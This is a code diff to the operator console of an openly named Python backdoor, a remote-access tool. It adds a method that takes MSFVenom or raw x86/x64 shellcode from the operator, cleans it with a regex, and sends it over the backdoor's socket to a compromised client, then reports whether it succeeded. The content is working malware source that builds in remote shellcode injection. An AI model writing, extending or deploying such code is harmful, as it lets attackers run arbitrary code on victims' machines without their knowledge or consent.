@@ -5,8 +5,12 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-
+import ast
+import base64
+import codecs
 import logging
+import re
+import socket
 import time
 
 from src import errors, helper
@@ -17,6 +21,37 @@ class Control:
     def __init__(self, socket):
         self.socket = socket
         self.logger = logging.getLogger(LOGGER_ID)
+
+    def shellcode(self):
+        if self.socket.get_curr_address()['x64_python']:
+            _encoding = "x64"
+        else:
+            _encoding = "x86"
+
+        print(f"Enter {_encoding} byte encoded shellcode (\\x00\\...) or MSFVenom py output (enter 'done' when fully "
+              f"entered)")
+
+        data = r""
+        while True:
+            _input = input()
+
+            if _input.lower() == "done":
+                break
+            else:
+                data += _input
+
+        # regular expression to parse the msfvenom output
+        buf = re.sub("buf.?(\\+)?=.?.?.?\"", "", data)
+        buf = buf.replace("\n", "")
+        buf = buf.replace("\"", "")
+
+        self.socket.sendall_json(CLIENT_SHELLCODE, buf)
+
+        rsp = self.socket.recv_json()
+        if rsp["key"] == ERROR:
+            self.logger.error(rsp["value"])
+        elif rsp["key"] == SUCCESS:
+            self.logger.info("OK.")
 
     def info(self):
         out = ""
